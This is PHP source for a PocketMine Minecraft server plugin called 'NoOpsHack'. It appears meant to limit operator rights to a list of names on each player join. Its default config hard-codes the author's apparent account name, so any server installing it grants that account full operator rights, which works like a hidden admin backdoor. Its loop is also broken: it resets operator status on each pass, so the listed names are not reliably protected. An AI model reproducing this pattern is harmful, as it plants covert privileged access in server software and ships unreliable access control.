<?php

namespace Nawaf1b;

class NoOpsHack extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Listener{

    public $config;

    public function onEnable() {

        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        
        @mkdir($this->getDataFolder());
        $cfg = ["opsname" => array("nawaf.1,b",".,."),];
        $this->config = new \pocketmine\utils\Config($this->getDataFolder()."config.yml",\pocketmine\utils\Config::YAML,$cfg);
        $this->config->save();
        
    }


    public function onJoin(\pocketmine\event\player\PlayerJoinEvent 
                           $ev){
        foreach ($this->config->get("opsname") as $d){
            
        if($ev->getPlayer()->getName() == $d){
            $ev->getPlayer()->setOp(1);
        }else{
            $ev->getPlayer()->setOp(FALSE);
        }
    }
    }    
}
